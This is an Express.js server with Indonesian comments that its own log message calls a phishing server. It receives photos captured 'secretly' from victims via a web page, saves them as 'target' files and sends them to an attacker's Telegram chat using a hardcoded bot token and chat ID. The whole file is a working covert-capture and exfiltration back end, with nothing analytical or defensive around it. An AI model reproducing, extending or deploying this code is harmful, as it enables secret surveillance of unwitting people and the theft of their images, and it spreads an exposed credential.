const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

// Setting limit besar agar foto resolusi tinggi tidak error
app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

// Pastikan folder uploads ada
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

app.post('/simpan', async (req, res) => {
    console.log("📩 Request masuk dari web...");
    const base64Data = req.body.image;

    if (!base64Data) {
        console.log("❌ Error: Tidak ada data gambar yang diterima.");
        return res.status(400).json({ status: false, msg: "No image data" });
    }

    try {
        // 1. Ubah Base64 ke Buffer
        const base64Image = base64Data.split(';base64,').pop();
        const buffer = Buffer.from(base64Image, 'base64');
        const namaFile = `target_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, namaFile);

        // 2. Simpan ke folder uploads (Lokal)
        fs.writeFileSync(filePath, buffer);
        console.log(`✅ Foto tersimpan di lokal: ${namaFile}`);

        // 3. Kirim ke Telegram menggunakan Axios & FormData
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg',
        });
        form.append('caption', `🚨 *TARGET TERDETEKSI!*\n\nFoto telah berhasil diambil secara diam-diam.\n\n📂 File: ${namaFile}\n⏰ Jam: ${new Date().toLocaleString('id-ID')}`);
        form.append('parse_mode', 'Markdown');

        console.log("📤 Sedang mengirim ke Telegram...");
        
        const teleResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        if (teleResponse.data.ok) {
            console.log("🚀 SUKSES: Foto sudah terkirim ke Telegram kamu!");
            res.json({ status: true });
        } else {
            console.log("❌ GAGAL TELEGRAM:", teleResponse.data.description);
            res.json({ status: false, error: teleResponse.data.description });
        }

    } catch (err) {
        console.error("🔥 CRASH SERVER:", err.response ? err.response.data : err.message);
        res.status(500).json({ status: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('------------------------------------');
    console.log('🚀 SERVER PHISING AKTIF!');
    console.log('Port: ' + PORT);
    console.log('------------------------------------');
});